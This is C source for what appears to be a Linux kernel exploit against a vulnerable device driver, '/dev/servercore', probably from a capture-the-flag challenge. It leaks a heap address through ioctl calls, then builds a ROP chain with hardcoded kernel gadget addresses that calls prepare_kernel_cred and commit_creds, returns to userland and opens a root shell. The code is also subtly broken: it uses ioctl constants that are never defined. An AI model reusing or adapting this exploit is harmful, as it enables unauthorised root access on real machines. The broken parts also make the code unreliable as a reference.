#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/timerfd.h>
#include <sys/msg.h>
#include <sys/socket.h>

#define DO_CREATE    0xc020ca00
#define DO_READ      0xc020ca01
#define DO_WRITE     0xc020ca02
#define DO_RESIZE    0xc020ca03
#define DO_DELETE    0xc020ca04

// Global variables
int fd = 0; 
uint64_t kernel_base = 0xffffffff81000000;
uint64_t heap_leak = 0; 

// Module stuff
struct req {
    uint64_t idx;
    uint64_t info_addr;
    uint64_t note_size;
    uint64_t note_addr;
};

int create_data(char * info, char * note_addr) {
    struct req req; 
    req.idx = 0; 
    req.info_addr = (uint64_t) info;
    req.note_size = 0;
    req.note_addr = (uint64_t) note_addr; 
    
    if (ioctl(fd, DO_CREATE, &req) < 0) {
        perror("[!] Create failed");
        return -1;
    }
    printf("[+] Performed create\n");
    return 0;
}

int read_data(char * info, uint64_t idx, char * note_addr) {
    struct req req; 
    req.idx = idx; 
    req.info_addr = (uint64_t) info;
    req.note_size = 0;
    req.note_addr = (uint64_t) note_addr; 
    
    if (ioctl(fd, DO_READ, &req) < 0) {
        perror("[!] Read failed");
        return -1;
    }
    printf("[+] Performed read\n");
    return 0;
}

int note_data(uint64_t idx, uint64_t note_size, char * note_addr) {
    struct req req; 
    req.idx = idx; 
    req.info_addr = 0;
    req.note_size = note_size;
    req.note_addr = (uint64_t) note_addr; 
    
    if (ioctl(fd, DO_NOTE, &req) < 0) {
        perror("[!] Read failed");
        return -1;
    }
    printf("[+] Created note for object %d\n", idx);
    return 0;
}

int delete_data(uint64_t idx) {
    struct req req; 
    req.idx = idx; 
    req.info_addr = 0;
    req.note_size = 0;
    req.note_addr = 0; 
    
    if (ioctl(fd, DO_DELETE, &req) < 0) {
        perror("[!] Delete failed");
        return -1;
    }
    printf("[+] Performed delete\n");
    return 0;
}

int sync_data(uint64_t idx) {
    struct req req; 
    req.idx = idx; 
    req.info_addr = 0;
    req.note_size = 0;
    req.note_addr = 0; 
    
    if (ioctl(fd, DO_SYNC, &req) < 0) {
        perror("[!] Sync failed");
        return -1;
    }
    printf("[+] Performed sync\n");
    return 0;
}

// PWNY STUFF
unsigned long user_cs, user_ss, user_rflags, user_sp;
void save_state() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[+] Saved state");
}

// GET SHELL
void get_shell(void) {
    puts("[+] Returned to userland");
    if (getuid() == 0){
        printf("[+] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}
unsigned long user_rip = (unsigned long)get_shell;

int main(void) {
    char info[0x1000];
    char note[0x1000]; 

    // STAGE 1: SETUP
    printf("STAGE 1: SETUP\n");
    printf("[+] Initial setup\n");
    cpu_set_t cpu;
    CPU_ZERO(&cpu);
    CPU_SET(0, &cpu);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu)) {
        perror("sched_setaffinity");
        exit(-1);
    }
    
    // Open servercore device
    printf("[+] Opening servercore device\n");
    if ((fd = open("/dev/servercore", O_RDONLY)) < 0) {
        perror("[!] Failed to open miscdevice");
        exit(-1);
    }
    
    // STAGE 2: GETTING A LEAK
    printf("STAGE 2: GETTING A LEAK\n"); 
    memset(note, 0x0, sizeof(note)); 
    memset(info, 0x41, sizeof(info)); 
    create_data(info, note); 
    heap_leak = ((uint64_t *)note)[0];
    printf("[+] Heap leak: 0x%llx\n", heap_leak); 

    memset(note, 0x0, sizeof(note)); 
    memset(info, 0x42, sizeof(info)); 
    create_data(info, note); 
    
    // STAGE 3: EXPLOIT
    printf("STAGE 3: EXPLOIT!!\n"); 
    
    printf("[+] Building ROP chain\n"); 
    memset(note, 0x44, sizeof(note)); 
    
    // Save state and signal handler
    save_state(); 
    signal(SIGSEGV, get_shell);
    
    uint64_t *rop;
    uint64_t *fifth; 
    rop = (uint64_t)note + 0x3f8;
    *rop = 0xffffffff81b3951f; // First ROP point -- push rdi ; jmp qword ptr [rsi + 0x66]
    
    rop = (uint64_t)note + 0x66; 
    *rop = 0x4141414141414141;
    *rop++ = 0xffffffff8115c5af; // Second ROP point -- pop rsp ; ret
    
    rop = (uint64_t) note; 
    *rop = 0x4141414141414141; 
    *rop++ = 0xffffffff814dd230; // Third ROP point -- ret 0x100; 
    *rop++ = 0xffffffff81000426; // ret;
    
    rop = (uint64_t) note + 0x110;
    *rop = 0x4141414141414141; 
    *rop++ = 0xffffffff81181add; // Fourth ROP point -- pop rdi ; ret
    *rop++ = 0xffffffff82a0c900; // init_task
    *rop++ = 0xffffffff810b9da0; // prepare_kernel_cred
    *rop++ = 0xffffffff81092733; // pop rcx ; ret 
    *rop++ = heap_leak + 0x3e0; 
    *rop++ = 0xffffffff813c5d47; // push rax ; jmp qword ptr [rcx] -- Go to fifth ROP point
    
    fifth = (uint64_t) note + 0x3e0; 
    *fifth = 0xffffffff81181add; // pop rdi ; ret
    
    *rop++ = 0xffffffff810b9b10; // Sixth ROP point -- commit_creds
    *rop++ = 0xffffffff81ebac08; // swapgs ; jmp ; ret 
    *rop++ = 0xffffffff81037e43; // iretq
    *rop++ = user_rip;
    *rop++ = user_cs; 
    *rop++ = user_rflags;
    *rop++ = user_sp;
    *rop++ = user_ss; 
    
    printf("[+] Trigger!!!\n");
    delete_data(0); 
    note_data(1, 0x400, note); 
    sync_data(0); 
    
    return 0; 
}

// 0xffffffffa00000c0 -- ioctl_module 
// 0xffffffffa0002660 -- data_array
// 0xffffffffa0002640 -- data_count

// 0xffffffff810b9b10 -- commit_creds
// 0xffffffff810b9da0 -- prepare_kernel_cred
// 0xffffffff82a0c900 -- init_task
// 0xffffffff813c5d47 : push rax ; jmp qword ptr [rcx]
// 0xffffffff81092733 : pop rcx ; ret
// 0xffffffff81037e43 : iretq
